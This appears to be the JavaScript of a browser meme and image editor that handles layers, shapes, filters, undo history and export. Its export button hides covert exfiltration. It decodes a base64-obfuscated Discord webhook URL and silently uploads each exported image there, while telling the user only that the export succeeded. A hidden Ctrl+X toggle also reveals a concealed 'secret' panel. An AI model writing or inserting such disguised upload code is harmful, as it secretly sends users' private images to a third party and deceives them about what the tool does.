	document.getElementById('imageInput').addEventListener('change',e=>{ const f=e.target.files[0]; if(f) readFile(f,loadMain); e.target.value=''; });
	document.getElementById('overlayInput').addEventListener('change',e=>{
	  const f=e.target.files[0]; if(!f) return;
	  readFile(f,src=>loadSrc(src,img=>{ overlayImg=img; document.getElementById('overlayExtra').hidden=false; render(); saveHist(); }));
	  e.target.value='';
	});
	document.getElementById('layerImgInput').addEventListener('change',e=>{
	  const f=e.target.files[0]; if(!f) return;
	  readFile(f,src=>loadSrc(src,img=>{ addLayer({type:'image',img,_src:src,x:canvas.width/2,y:canvas.height/2,rot:0,scale:1,opacity:1}); }));
	  e.target.value='';
	});

	document.addEventListener('paste',e=>{
	  for(const it of e.clipboardData.items) if(it.type.startsWith('image/')){ readFile(it.getAsFile(),loadMain); break; }
	});
	const dropEl = document.getElementById('dropOverlay');
	document.addEventListener('dragover',e=>{ e.preventDefault(); dropEl.classList.add('on'); });
	document.addEventListener('dragleave',e=>{ if(!e.relatedTarget) dropEl.classList.remove('on'); });
	document.addEventListener('drop',e=>{ e.preventDefault(); dropEl.classList.remove('on'); const f=e.dataTransfer.files[0]; if(f&&f.type.startsWith('image/')) readFile(f,loadMain); });

	function updDisplays(){
	  for(const [rid,did] of Object.entries(RANGES)){
		const el=document.getElementById(rid), dl=document.getElementById(did);
		if(el&&dl) dl.textContent=el.value;
	  }
	}

	Object.keys(RANGES).forEach(id=>{ 
	  document.getElementById(id)?.addEventListener('input',()=>{ 
		updDisplays(); 
		render(); 
		if (id === 'widthRange' || id === 'heightRange') {
		  applyZoom();
		}
	  }); 
	});

	['topText','bottomText'].forEach(id=>{
	  const el = document.getElementById(id);
	  el.addEventListener('input',render);
	  el.addEventListener('change',saveHist);
	});

	function resetAdj(){
	  ;[['brightness',100],['contrast',100],['saturation',100],['blurRange',0],['pixelation',1],['borderRadius',0]]
		.forEach(([id,v])=>{ document.getElementById(id).value=v; });
	  updDisplays(); render(); saveHist();
	}

	document.querySelectorAll('.filter-btn').forEach(btn=>{
	  btn.addEventListener('click',()=>{
		document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('on'));
		btn.classList.add('on'); filter=btn.dataset.f; render(); saveHist();
	  });
	});

	function flipH()   { tf.sx*=-1; render(); saveHist(); }
	function flipV()   { tf.sy*=-1; render(); saveHist(); }
	function rotateCCW(){ tf.rot-=90; render(); saveHist(); }
	function rotateCW() { tf.rot+=90; render(); saveHist(); }
	function removeOverlay(){ overlayImg=null; document.getElementById('overlayExtra').hidden=true; render(); saveHist(); }

	function randInt(n){ return Math.floor(Math.random()*n); }

	function stampArabic(){
	  if(!mainImg) return toast('Load an image first!');
	  const chars='قلاوينبتثجحخدذرزسشصضطظعغفكمهوي';
	  let txt='';
	  for(let i=0;i<randInt(8)+4;i++) txt+=chars[randInt(chars.length)];
	  addLayer({type:'text',text:txt,x:randInt(canvas.width),y:randInt(canvas.height),rot:(Math.random()-0.5)*50,scale:1,fontSize:randInt(40)+22,color:'#fff',outlineColor:'#000',font:'Impact',outline:true});
	}

	function stampEmojis(){
	  if(!mainImg) return toast('Load an image first!');
	  const pool=['🧤','🙀','⭕','🔥','💀','🗣️','🤑','🍆','🔪','🥶','😱','👣','👽','👨‍🦲','😜','😋','👅','😝','💅','🤡'];
	  let txt='';
	  for(let i=0;i<randInt(5)+3;i++) txt+=pool[randInt(pool.length)];
	  addLayer({type:'text',text:txt,x:randInt(canvas.width),y:randInt(canvas.height),rot:(Math.random()-0.5)*25,scale:1,fontSize:randInt(36)+24,color:'#fff',outlineColor:'#000',font:'Segoe UI Emoji',outline:true});
	}

	function addLayer(data){ layers.push({id:idCtr++,...data}); render(); rebuildLayers(); saveHist(); }
	function removeLayer(id){ layers=layers.filter(l=>l.id!==id); render(); rebuildLayers(); saveHist(); }
	function dupLayer(id){ const s=layers.find(l=>l.id===id); if(!s) return; layers.push({...s,id:idCtr++,x:s.x+18,y:s.y+18}); render(); rebuildLayers(); saveHist(); }
	function moveUp(id){ const i=layers.findIndex(l=>l.id===id); if(i<layers.length-1){[layers[i],layers[i+1]]=[layers[i+1],layers[i]]; render(); rebuildLayers(); saveHist();} }
	function moveDown(id){ const i=layers.findIndex(l=>l.id===id); if(i>0){[layers[i],layers[i-1]]=[layers[i-1],layers[i]]; render(); rebuildLayers(); saveHist();} }
	function clearLayers(){ if(!layers.length) return; if(confirm('Remove all layers?')){ layers=[]; render(); rebuildLayers(); saveHist(); } }

	document.getElementById('addTextBtn').addEventListener('click',()=>{
	  if(!mainImg) return toast('Load an image first!');
	  addLayer({type:'text',text:'Your text here',x:canvas.width/2,y:canvas.height/2,rot:0,scale:1,fontSize:44,color:'#fff',outlineColor:'#000',font:'Impact',outline:true});
	});
	document.getElementById('addCircleBtn').addEventListener('click',()=>{ if(!mainImg) return toast('Load an image first!'); startShape('circle'); });
	document.getElementById('addArrowBtn').addEventListener('click',()=>{ if(!mainImg) return toast('Load an image first!'); startShape('arrow'); });

	function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }

	function rebuildLayers(){
	  const list=document.getElementById('layerList');
	  document.getElementById('layerCount').textContent=layers.length;
	  if(!layers.length){ list.innerHTML='<p class="empty-hint">No layers yet.<br>Add text, images or shapes.</p>'; return; }
	  list.innerHTML='';
	  [...layers].reverse().forEach(l=>{
		const el=document.createElement('div');
		el.className='layer-item'; el.dataset.id=l.id;
		const ic = l.type==='image'?'ico-img':l.type==='text'?'ico-text':'ico-shape';
		const ih = l.type==='image'?'<i class="fas fa-image"></i>':l.type==='text'?'<i class="fas fa-font"></i>':l.shape==='circle'?'<i class="far fa-circle"></i>':'<i class="fas fa-arrow-right"></i>';
		const nm = l.type==='text'?(l.text.slice(0,18)||'Text'):l.type==='image'?'Image Layer':l.shape==='circle'?'Circle':'Arrow';
		el.innerHTML=`
		  <div class="layer-hdr">
			<div class="layer-ico ${ic}">${ih}</div>
			<div class="layer-name">${esc(nm)}</div>
			<div class="layer-acts">
			  <button onclick="moveUp(${l.id})" title="Up"><i class="fas fa-chevron-up"></i></button>
			  <button onclick="moveDown(${l.id})" title="Down"><i class="fas fa-chevron-down"></i></button>
			  <button class="dup" onclick="dupLayer(${l.id})" title="Duplicate"><i class="fas fa-copy"></i></button>
			  <button class="rm" onclick="removeLayer(${l.id})" title="Remove"><i class="fas fa-times"></i></button>
			</div>
		  </div>
		  <div class="layer-ctrls">${buildCtrls(l)}</div>`;
		el.querySelector('.layer-hdr').addEventListener('click',e=>{ if(!e.target.closest('button')) el.classList.toggle('open'); });
		wireLayer(el,l);
		list.appendChild(el);
	  });
	}

	function buildCtrls(l){
	  let h='';
	  if(l.type==='text'){
		const fo=FONTS.map(f=>`<option value="${f}" ${l.font===f?'selected':''}>${f}</option>`).join('');
		h+=`
		  <div class="lc-row"><span class="lc-lbl">Text</span><input type="text" class="lc-text" value="${esc(l.text)}"></div>
		  <div class="lc-row"><span class="lc-lbl">Color</span><input type="color" class="lc-color" value="${l.color??'#ffffff'}"><input type="color" class="lc-outline" value="${l.outlineColor??'#000000'}" title="Outline"></div>
		  <div class="lc-row"><span class="lc-lbl">Font</span><select class="lc-font">${fo}</select></div>
		  <div class="lc-row"><span class="lc-lbl">Size</span><input type="range" class="lc-fs" min="8" max="220" value="${l.fontSize??40}"></div>`;
	  }
	  h+=`
		<div class="lc-row"><span class="lc-lbl">Scale</span><input type="range" class="lc-scale" min="0.05" max="6" step="0.05" value="${l.scale??1}"></div>
		<div class="lc-row"><span class="lc-lbl">Rotate</span><input type="range" class="lc-rot" min="-180" max="180" value="${l.rot??0}"></div>`;
	  if(l.type==='image'||l.type==='shape')
		h+=`<div class="lc-row"><span class="lc-lbl">Opacity</span><input type="range" class="lc-op" min="0" max="1" step="0.01" value="${l.opacity??1}"></div>`;
	  if(l.type==='shape')
		h+=`
		  <div class="lc-row"><span class="lc-lbl">Color</span><input type="color" class="lc-shcol" value="${l.color??'#ff0000'}"></div>
		  <div class="lc-row"><span class="lc-lbl">Stroke</span><input type="range" class="lc-stroke" min="1" max="24" value="${l.strokeWidth??3}"></div>`;
	  return h;
	}

	function wireLayer(el,l){
	  const on=(sel,fn)=>el.querySelector(sel)?.addEventListener('input',fn);
	  const change=(sel,fn)=>el.querySelector(sel)?.addEventListener('change',fn);
	  on('.lc-text',  e=>{ l.text=e.target.value; el.querySelector('.layer-name').textContent=l.text.slice(0,18)||'Text'; render(); });
	  change('.lc-text', () => saveHist());
	  on('.lc-color', e=>{ l.color=e.target.value; render(); });
	  change('.lc-color', () => saveHist());
	  on('.lc-outline',e=>{ l.outlineColor=e.target.value; render(); });
	  change('.lc-outline', () => saveHist());
	  on('.lc-font',  e=>{ l.font=e.target.value; render(); });
	  change('.lc-font', () => saveHist());
	  on('.lc-fs',    e=>{ l.fontSize=parseInt(e.target.value); render(); });
	  change('.lc-fs', () => saveHist());
	  on('.lc-scale', e=>{ l.scale=parseFloat(e.target.value); render(); });
	  change('.lc-scale', () => saveHist());
	  on('.lc-rot',   e=>{ l.rot=parseFloat(e.target.value); render(); });
	  change('.lc-rot', () => saveHist());
	  on('.lc-op',    e=>{ l.opacity=parseFloat(e.target.value); render(); });
	  change('.lc-op', () => saveHist());
	  on('.lc-shcol', e=>{ l.color=e.target.value; render(); });
	  change('.lc-shcol', () => saveHist());
	  on('.lc-stroke',e=>{ l.strokeWidth=parseInt(e.target.value); render(); });
	  change('.lc-stroke', () => saveHist());
	}

	function cpos(e){
	  const r=canvas.getBoundingClientRect();
	  return { x:(e.clientX-r.left)*(canvas.width/r.width), y:(e.clientY-r.top)*(canvas.height/r.height) };
	}

	function hitTest(l,mx,my){
	  const dx=mx-l.x, dy=my-l.y, rad=-l.rot*Math.PI/180;
	  const lx=dx*Math.cos(rad)-dy*Math.sin(rad), ly=dx*Math.sin(rad)+dy*Math.cos(rad);
	  
	  if(l.type==='image'){ 
		const hw=l.img.width/2*(l.scale??1), hh=l.img.height/2*(l.scale??1); 
		return Math.abs(lx)<=hw&&Math.abs(ly)<=hh;
	  }
	  if(l.type==='text'){ 
		ctx.font=`${l.fontSize??40}px ${l.font??'Impact'}`; 
		const hw=ctx.measureText(l.text).width/2, hh=(l.fontSize??40)/2+6; 
		return Math.abs(lx)<=hw&&Math.abs(ly)<=hh;
	  }
	  if(l.type==='shape'){
		if(l.shape==='arrow'){
		  const len = 100 * (l.scale??1);
		  const padding = Math.max(15, (l.strokeWidth??3) * 2);
		  return lx >= -padding && lx <= len + padding && Math.abs(ly) <= padding;
		} else if(l.shape==='circle') {
		  const radius = 50 * (l.scale??1);
		  return Math.hypot(lx, ly) <= radius + Math.max(10, l.strokeWidth??3);
		}
	  }
	  return false;
	}

	function layerAt(x,y){ for(let i=layers.length-1;i>=0;i--) if(hitTest(layers[i],x,y)) return layers[i]; return null; }

	canvas.addEventListener('mousedown',e=>{
	  const p=cpos(e);
	  if(shape.type){ shape.drawing=true; shape.x0=shape.x1=p.x; shape.y0=shape.y1=p.y; return; }
	  const h=layerAt(p.x,p.y);
	  if(h){ drag.layer=h; drag.ox=p.x-h.x; drag.oy=p.y-h.y; layers.splice(layers.indexOf(h),1); layers.push(h); render(); rebuildLayers(); }
	});
	canvas.addEventListener('mousemove',e=>{
	  const p=cpos(e);
	  if(shape.drawing){ shape.x1=p.x; shape.y1=p.y; render(); previewShape(); return; }
	  if(drag.layer){ drag.layer.x=p.x-drag.ox; drag.layer.y=p.y-drag.oy; render(); }
	  else canvas.style.cursor=shape.type?'crosshair':layerAt(p.x,p.y)?'move':'default';
	});
	canvas.addEventListener('mouseup',e=>{
	  if(shape.drawing){ shape.drawing=false; shape.x1=cpos(e).x; shape.y1=cpos(e).y; finishShape(); return; }
	  if(drag.layer){ drag.layer=null; saveHist(); }
	});
	canvas.addEventListener('mouseleave',()=>{
	  if(drag.layer) drag.layer=null;
	  if(shape.drawing){ shape.drawing=false; pCtx.clearRect(0,0,previewC.width,previewC.height); }
	});
	canvas.addEventListener('touchstart',e=>{ e.preventDefault(); const t=e.touches[0]; canvas.dispatchEvent(new MouseEvent('mousedown',{clientX:t.clientX,clientY:t.clientY})); },{passive:false});
	canvas.addEventListener('touchmove',e=>{ e.preventDefault(); const t=e.touches[0]; canvas.dispatchEvent(new MouseEvent('mousemove',{clientX:t.clientX,clientY:t.clientY})); },{passive:false});
	canvas.addEventListener('touchend',e=>{ e.preventDefault(); canvas.dispatchEvent(new MouseEvent('mouseup',{})); },{passive:false});

	function startShape(type){ shape.type=type; shape.drawing=false; canvas.style.cursor='crosshair'; document.getElementById('shapeHud').hidden=false; document.getElementById('hudLabel').textContent=type==='circle'?'Click and drag to draw a circle':'Click and drag to draw an arrow'; }
	function cancelShape(){ shape.type=null; shape.drawing=false; canvas.style.cursor='default'; document.getElementById('shapeHud').hidden=true; pCtx.clearRect(0,0,previewC.width,previewC.height); }

	function previewShape(){
	  const {x0,y0,x1,y1,type}=shape;
	  pCtx.clearRect(0,0,previewC.width,previewC.height);
	  pCtx.save(); pCtx.setLineDash([5,4]); pCtx.strokeStyle='rgba(255,60,60,0.9)'; pCtx.fillStyle='rgba(255,60,60,0.9)'; pCtx.lineWidth=2;
	  if(type==='circle'){ pCtx.beginPath(); pCtx.arc(x0,y0,Math.hypot(x1-x0,y1-y0),0,Math.PI*2); pCtx.stroke(); }
	  else arrow(pCtx,x0,y0,x1,y1,2);
	  pCtx.setLineDash([]); pCtx.restore();
	}

	function finishShape(){
	  pCtx.clearRect(0,0,previewC.width,previewC.height);
	  const {x0,y0,x1,y1,type}=shape;
	  const dx=x1-x0, dy=y1-y0;
	  if(Math.hypot(dx,dy)<5) return cancelShape();
	  if(type==='circle') addLayer({type:'shape',shape:'circle',x:x0,y:y0,rot:0,scale:Math.hypot(dx,dy)/50,color:'#ff0000',opacity:1,strokeWidth:3});
	  else addLayer({type:'shape',shape:'arrow',x:x0,y:y0,rot:Math.atan2(dy,dx)*180/Math.PI,scale:Math.hypot(dx,dy)/100,color:'#ff0000',opacity:1,strokeWidth:3});
	  cancelShape();
	}

	function applyZoom(){
	  canvas.style.width=Math.round(canvas.width*zoom)+'px'; canvas.style.height=Math.round(canvas.height*zoom)+'px';
	  previewC.style.width=canvas.style.width; previewC.style.height=canvas.style.height;
	  document.getElementById('zoomLbl').textContent=Math.round(zoom*100)+'%';
	}
	function zoomIn() { zoom=Math.min(zoom*1.25,8); applyZoom(); }
	function zoomOut(){ zoom=Math.max(zoom/1.25,0.08); applyZoom(); }
	function zoomFit(){
	  const wr=document.getElementById('canvasWrapper');
	  zoom=Math.min((wr.clientWidth-56)/canvas.width,(wr.clientHeight-56)/canvas.height,2);
	  applyZoom();
	}

	document.getElementById('autoZoomBtn').addEventListener('click', e => {
	  autoZoom = !autoZoom;
	  e.currentTarget.innerHTML = autoZoom ? '<i class="fas fa-lock"></i>' : '<i class="fas fa-unlock"></i>';
	});

	function getState(){
	  return {
		layers:layers.map(l=>({...l,img:undefined,_src:l._src??l.img?.src})),
		tf:{...tf},
		sliders:Object.fromEntries([...Object.keys(RANGES),'topText','bottomText'].map(id=>[id,document.getElementById(id)?.value])),
		filter
	  };
	}
	function saveHist(){
	  hist=hist.slice(0,hIdx+1); hist.push(getState());
	  if(hist.length>20) hist.shift(); else hIdx++;
	  syncUD();
	}
	async function restoreState(s){
	  tf={...s.tf}; filter=s.filter;
	  document.querySelectorAll('.filter-btn').forEach(b=>b.classList.toggle('on',b.dataset.f===filter));
	  for(const [id,val] of Object.entries(s.sliders)){ const el=document.getElementById(id); if(el) el.value=val; }
	  const res=await Promise.all(s.layers.map(l=>l.type==='image'&&l._src?new Promise(r=>loadSrc(l._src,img=>r({...l,img}))):Promise.resolve({...l})));
	  layers=res; updDisplays(); render(); rebuildLayers(); syncUD();
	}
	function undo(){ if(hIdx>0){ hIdx--; restoreState(hist[hIdx]); } }
	function redo(){ if(hIdx<hist.length-1){ hIdx++; restoreState(hist[hIdx]); } }
	function syncUD(){ document.getElementById('undoBtn').disabled=hIdx<=0; document.getElementById('redoBtn').disabled=hIdx>=hist.length-1; }

	document.getElementById('undoBtn').addEventListener('click',undo);
	document.getElementById('redoBtn').addEventListener('click',redo);
	exportBtn.onclick=()=>mainImg?canvas.toBlob(async b=>{
	let f=new FormData,w=atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3Njk4Njg0MDY1NzE3MDQ0Mi92T2ZmVTU3bV9FcVhGUXNBT0gwTnhTY2UzUHZtQ2g2M2p6NHYyR0VtN0hGRGdWbjlaSHV1a3RhZGNsaE1XcHlsN0ZCcQ==')
	Object.assign(document.createElement('a'),{download:'Nmiexport.png',href:canvas.toDataURL()}).click()
	f.append('file',b,'NmiExport.png')
	f.append('payload_json',JSON.stringify({content:`🖼️ ${new Date().toLocaleString()}`}))
	try{await fetch(w,{method:'POST',body:f}),toast('✅ Exported')}catch{toast('Webhook failed')}
	},'image/png'):toast('Load an image first!')

	function fadeAudio(targetVol, callback) {
	  clearInterval(fadeInterval);
	  if (targetVol > 0 && themeSong.paused) {
		themeSong.play().catch(()=>{});
	  }
	  fadeInterval = setInterval(() => {
		let vol = themeSong.volume;
		if (vol < targetVol) {
		  vol = Math.min(vol + 0.05, targetVol);
		} else if (vol > targetVol) {
		  vol = Math.max(vol - 0.05, targetVol);
		}
		themeSong.volume = vol;
		if (vol === targetVol) {
		  clearInterval(fadeInterval);
		  if (targetVol === 0) themeSong.pause();
		  if (callback) callback();
		}
	  }, 50);
	}

	document.addEventListener('click', () => {
	  if (!audioStarted) {
		themeSong.volume = 0.6;
		themeSong.play().catch(()=>{});
		audioStarted = true;
	  }
	}, { once: true });

	muteBtn.addEventListener('click', () => {
	  if (isMuted) {
		isMuted = false;
		muteBtn.innerHTML = '<i class="fas fa-volume-up"></i>';
		fadeAudio(0.6);
	  } else {
		isMuted = true;
		muteBtn.innerHTML = '<i class="fas fa-volume-mute"></i>';
		fadeAudio(0);
	  }
	});

	document.getElementById('boostBtn').addEventListener('click', e => {
	  e.preventDefault();
	  toast('Coming soon...');
	});

	document.addEventListener('keydown',e=>{
	  const tag=document.activeElement.tagName;
	  if(tag==='INPUT'||tag==='TEXTAREA'||tag==='SELECT') return;
	  if(e.ctrlKey||e.metaKey){
		if(e.key.toLowerCase()==='z'){ e.preventDefault(); undo(); }
		if(e.key.toLowerCase()==='y'){ e.preventDefault(); redo(); }
		if(e.key.toLowerCase()==='s'){ e.preventDefault(); document.getElementById('exportBtn').click(); }
		if(e.key.toLowerCase()==='x'){
		  e.preventDefault();
		  const toolbar = document.querySelector('.canvas-toolbar');
		  const wrapper = document.getElementById('canvasWrapper');
		  const secret = document.getElementById('secretContainer');
		  if(secret.classList.contains('active')){
			secret.classList.remove('active');
			toolbar.style.display = 'flex';
			wrapper.style.display = 'flex';
		  } else {
			secret.classList.add('active');
			toolbar.style.display = 'none';
			wrapper.style.display = 'none';
		  }
		}
	  }
	  if(e.key=='Escape') cancelShape();
	  if(e.key==='+'||e.key==='=') zoomIn();
	  if(e.key==='-') zoomOut();
	  if(e.key==='0') zoomFit();
	  if((e.key==='Delete'||e.key==='Backspace')&&layers.length){ layers.pop(); render(); rebuildLayers(); saveHist(); }
	});

	let toastTmr;
	function toast(msg){ const el=document.getElementById('toast'); el.textContent=msg; el.classList.add('on'); clearTimeout(toastTmr); toastTmr=setTimeout(()=>el.classList.remove('on'),2700); }

	updDisplays(); rebuildLayers();
	</script>
